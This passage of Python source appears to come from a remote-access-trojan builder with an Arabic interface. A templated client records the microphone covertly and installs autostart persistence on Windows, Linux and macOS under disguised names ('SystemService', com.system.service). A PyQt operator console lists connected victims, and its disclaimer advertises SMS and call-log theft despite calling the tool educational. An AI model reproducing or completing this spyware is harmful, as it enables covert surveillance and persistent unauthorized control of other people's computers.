            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            self.audio = pyaudio.PyAudio()
            self.audio_stream = self.audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK
            )

            self.record_thread = threading.Thread(target=self._record_audio, args=(duration,))
            self.record_thread.daemon = True
            self.record_thread.start()

            return "بدأ تسجيل الصوت بنجاح"

        except Exception as e:
            return f"خطأ في بدء التسجيل: {{str(e)}}"

    def _record_audio(self, duration):
        start_time = time.time()

        while self.recording and (time.time() - start_time) < duration:
            try:
                data = self.audio_stream.read(1024)
                self.audio_frames.append(data)
            except Exception as e:
                break

        self.stop_recording()

    def stop_recording(self):
        try:
            self.recording = False

            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()

            if self.audio:
                self.audio.terminate()

            return "تم إيقاف تسجيل الصوت"

        except Exception as e:
            return f"خطأ في إيقاف التسجيل: {{str(e)}}"

    def save_recording(self, filename=None):
        try:
            if not self.audio_frames:
                return "لا توجد بيانات صوتية للحفظ"

            if not filename:
                filename = f"audio_recording_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.wav"

            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            wave_file = wave.open(filename, 'wb')
            wave_file.setnchannels(CHANNELS)
            wave_file.setsampwidth(2)
            wave_file.setframerate(RATE)
            wave_file.writeframes(b''.join(self.audio_frames))
            wave_file.close()

            return f"تم حفظ التسجيل في: {{filename}}"

        except Exception as e:
            return f"خطأ في حفظ التسجيل: {{str(e)}}"

class AutoPersistenceManager:
    def __init__(self):
        self.persistence_file = "client_persistence.json"
        self.installed = False

    def install_persistence(self, client_path):
        try:
            system = platform.system()
            client_data = {{
                'client_path': os.path.abspath(client_path),
                'install_time': datetime.now().isoformat(),
                'system': system,
                'auto_start': True
            }}

            with open(self.persistence_file, 'w', encoding='utf-8') as f:
                json.dump(client_data, f, indent=2)

            if system == "Windows":
                self._install_windows_persistence(client_path)
            elif system == "Linux":
                self._install_linux_persistence(client_path)
            elif system == "Darwin":
                self._install_macos_persistence(client_path)

            self.installed = True
            return "تم تثبيت الثبات بنجاح على جميع الأنظمة"

        except Exception as e:
            return f"خطأ في التثبيت: {{str(e)}}"

    def _install_windows_persistence(self, client_path):
        try:
            import winreg

            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, client_path)

        except Exception as e:
            print(f"Windows persistence error: {{e}}")

    def _install_linux_persistence(self, client_path):
        try:
            cron_job = f"@reboot python3 {{client_path}}\\n"
            # تنفيذ أوامر إضافة الثبات
            os.system(f'echo "{{cron_job}}" | crontab -')

        except Exception as e:
            print(f"Linux persistence error: {{e}}")

    def _install_macos_persistence(self, client_path):
        try:
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{{client_path}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""

            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.service.plist")
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)

            with open(plist_path, 'w') as f:
                f.write(plist_content)

        except Exception as e:
            print(f"macOS persistence error: {{e}}")

if __name__ == "__main__":
    client = EnhancedRemoteClient()
    client.start()
'''

    def handle_client_connected(self, client_info):
        client_text = (f"{client_info['ip']} | {client_info['user']} | "
                       f"{client_info['system']} | {client_info['connection_time']}")
        self.clients_list.addItem(client_text)

        for client in getattr(self.server_thread, 'clients', []):
            if client.client_info.get('ip') == client_info['ip']:
                self.clients.append(client)
                break

        self.handle_log(f"عميل جديد متصل: {client_info['ip']} ({client_info['user']})")
        self.load_persistent_connections()

    def handle_alert(self, message):
        QMessageBox.information(self, "إنذار النظام", message)
        self.handle_log(f"{message}")

    def handle_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        self.log_text.append(log_entry)

    def clear_logs(self):
        self.log_text.clear()

    def save_logs(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "حفظ سجل النشاطات",
            f"server_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text Files (*.txt)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.toPlainText())
                QMessageBox.information(self, "تم الحفظ", "تم حفظ سجل النشاطات بنجاح!")
            except Exception as e:
                QMessageBox.critical(self, "خطأ", f"فشل في الحفظ: {str(e)}")

def main():
        app = QApplication(sys.argv)

        disclaimer = QMessageBox()
        disclaimer.setWindowTitle("تنبيه أمني وأخلاقي")
        disclaimer.setText("""
    أداة تعليمية - للاستخدام الأخلاقي والشرعي فقط

    الميزات الجديدة المضافة:
    • نظام الحصول على الرسائل النصية الحقيقية
    • نظام الحصول على سجل المكالمات الحقيقي  
    • مسجل الصوت المتقدم مع التحكم الكامل
    • نظام الثبات التلقائي على جميع الأنظمة
    • حفظ تلقائي للإعدادات والعميل

    تحذير هام:
    • يجب استخدام هذه الأداة للأغراض التعليمية والاختبارات الأمنية المصرح بها فقط
    • أنت المسؤول الوحيد عن أي استخدام غير مصرح لهذه الأداة
    """)
        disclaimer.setStandardButtons(QMessageBox.StandardButton.Ok | QMessageBox.StandardButton.Cancel)

        if disclaimer.exec() == QMessageBox.StandardButton.Ok:
            # هنا نفترض أن EnhancedMainWindow مُعرف بالكامل سابقًا في الملف
            window = EnhancedMainWindow()
            window.show()
            sys.exit(app.exec())
        else:
            sys.exit()

    # --- تأكد أن هذا السطر خارج أي class أو دالة (وأن EnhancedMainWindow قد عُرِّف أعلاه) ---
if __name__ == "__main__":
        main()
